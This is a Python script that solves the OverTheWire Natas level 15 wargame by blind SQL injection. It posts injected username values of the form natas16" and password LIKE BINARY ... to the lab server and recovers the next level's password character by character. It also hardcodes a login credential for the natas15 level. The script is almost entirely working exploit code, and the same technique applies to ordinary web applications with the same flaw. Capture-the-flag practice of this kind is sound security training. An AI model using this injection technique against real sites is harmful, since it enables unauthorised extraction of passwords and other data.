#!/usr/bin/env python 

'''
Issue : Blind SQL Injection
My script had some issues, hence I modified this script https://github.com/Thraundil/natas/blob/master/natas15_doit.py
His script way better than mine , so credits to the author
'''
import requests
import string

URL = "http://natas15.natas.labs.overthewire.org/"

auth_name = 'natas15'
auth_pass = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits

known_letters = ""
password      = ""


for letter in alphabet:
    DATA = dict(username='natas16" and password LIKE BINARY "%' + letter + '%" #')
    r    = s.post(URL, data=DATA)
    if 'This user exists' in r.text:
        known_letters += letter

for x in range (0,32):
    for letter in known_letters:
        DATA = dict(username='natas16" and password LIKE BINARY "' + password + letter + '%" #')
        r    = s.post(URL, data=DATA)
        if 'This user exists' in r.text:
            password += letter
            print password
